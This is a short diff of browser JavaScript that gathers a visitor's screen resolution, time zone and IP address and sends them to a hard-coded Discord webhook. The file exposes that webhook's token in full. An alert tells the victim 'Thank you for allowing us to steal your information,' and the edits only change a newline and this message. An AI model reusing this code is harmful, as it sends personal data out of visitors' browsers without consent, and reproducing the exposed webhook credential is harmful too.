@@ -109,7 +109,7 @@
                     `📱 **Bildschirm:** ${info.screen.width}x${info.screen.height}\n` +
                     `🕓 **Zeitzone:** ${info.timezone}\n` +
                     `📡 **IP:** ${info.ip}\n` +
-                    `\n`;
+                    `\n\n`;
                 
                   const webhookUrl = "https://discord.com/api/webhooks/1429086643691978813/81htczWaHahtc6sHgNQSl8dea87q02cIhN-haBXJU4wIUntThmXsQ8BgeEvlitJJVe7D";
                 
@@ -124,7 +124,7 @@
                 
                     if (response.ok) {
                         console.log("Info sent to Discord");
-                        alert("Thank you for allowing us to steal your personal information");
+                        alert("Thank you for allowing us to steal your information");
                     } else {
                       console.error("Failed to send info to Discord");
                     }
